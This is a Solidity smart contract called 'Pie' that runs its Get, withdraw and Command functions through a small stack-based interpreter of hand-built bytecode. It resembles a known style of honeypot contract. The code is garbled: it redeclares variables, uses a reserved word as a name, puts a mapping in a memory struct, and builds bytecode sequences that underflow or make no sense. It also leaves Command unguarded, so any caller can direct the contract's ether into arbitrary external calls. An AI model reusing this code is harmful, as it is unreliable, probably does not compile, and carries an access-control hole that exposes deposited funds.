pragma solidity ^0.4.19;

contract Pie {
    address public Owner = msg.sender;
    
    enum InstructionSet { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL, TRANSFER }
    
    struct VM {
        uint pc;
        uint[] stack;
        bytes program;
        mapping(address => uint) register;
    }
    
    function() public payable {}
    
    function execute(bytes program) internal {
        VM memory vm = VM({ pc: 0, stack: new uint[](0), program: program });
        
        while (vm.pc < vm.program.length) {
            InstructionSet instruction = InstructionSet(vm.program[vm.pc++]);
            
            if (instruction == InstructionSet.PUSH) {
                uint value = uint(vm.program[vm.pc++]) << 8 | uint(vm.program[vm.pc++]);
                vm.stack.push(value);
            } else if (instruction == InstructionSet.POP) {
                vm.stack.length--;
            } else if (instruction == InstructionSet.ADD) {
                uint a = vm.stack[vm.stack.length - 2];
                uint b = vm.stack[vm.stack.length - 1];
                vm.stack[vm.stack.length - 2] = a + b;
                vm.stack.length--;
            } else if (instruction == InstructionSet.SUB) {
                uint a = vm.stack[vm.stack.length - 2];
                uint b = vm.stack[vm.stack.length - 1];
                vm.stack[vm.stack.length - 2] = a - b;
                vm.stack.length--;
            } else if (instruction == InstructionSet.JMP) {
                vm.pc = uint(vm.program[vm.pc++]);
            } else if (instruction == InstructionSet.JZ) {
                uint condition = vm.stack[--vm.stack.length];
                uint address = uint(vm.program[vm.pc++]);
                if (condition == 0) vm.pc = address;
            } else if (instruction == InstructionSet.LOAD) {
                address varAddress = address(vm.stack[--vm.stack.length]);
                vm.stack.push(vm.register[varAddress]);
            } else if (instruction == InstructionSet.STORE) {
                address varAddress = address(vm.stack[--vm.stack.length]);
                uint value = vm.stack[--vm.stack.length];
                vm.register[varAddress] = value;
            } else if (instruction == InstructionSet.CALL) {
                address adr = address(vm.stack[--vm.stack.length]);
                bytes memory data = new bytes(vm.stack[--vm.stack.length]);
                adr.call.value(vm.stack[--vm.stack.length])(data);
            } else if (instruction == InstructionSet.TRANSFER) {
                address to = address(vm.stack[--vm.stack.length]);
                uint amount = vm.stack[--vm.stack.length];
                to.transfer(amount);
            }
        }
    }
    
    function Get() public payable {
        bytes memory bytecode = new bytes(10);
        bytecode[0] = byte(InstructionSet.PUSH);
        bytecode[1] = 0x04;
        bytecode[2] = 0x00; 
        bytecode[3] = byte(InstructionSet.JZ);
        bytecode[4] = 0x09;
        bytecode[5] = byte(InstructionSet.TRANSFER);
        bytecode[6] = 0x00;
        bytecode[7] = byte(InstructionSet.TRANSFER);
        bytecode[8] = 0x00;
        bytecode[9] = byte(InstructionSet.POP);
        execute(bytecode);
    }
    
    function withdraw() payable public {
        bytes memory bytecode = new bytes(5);
        bytecode[0] = byte(InstructionSet.LOAD);
        bytecode[1] = 0x00;
        bytecode[2] = byte(InstructionSet.TRANSFER);
        bytecode[3] = 0x00;
        bytecode[4] = byte(InstructionSet.POP);
        execute(bytecode);
    }

    function Command(address adr, bytes data) payable public {
        bytes memory bytecode = new bytes(6 + data.length);
        bytecode[0] = byte(InstructionSet.LOAD);
        bytecode[1] = 0x00;
        bytecode[2] = byte(InstructionSet.CALL);
        bytecode[3] = 0x00;
        for (uint i = 0; i < data.length; i++) {
            bytecode[4 + i] = data[i];
        }
        bytecode[4 + data.length] = byte(InstructionSet.POP);
        execute(bytecode);
    }
}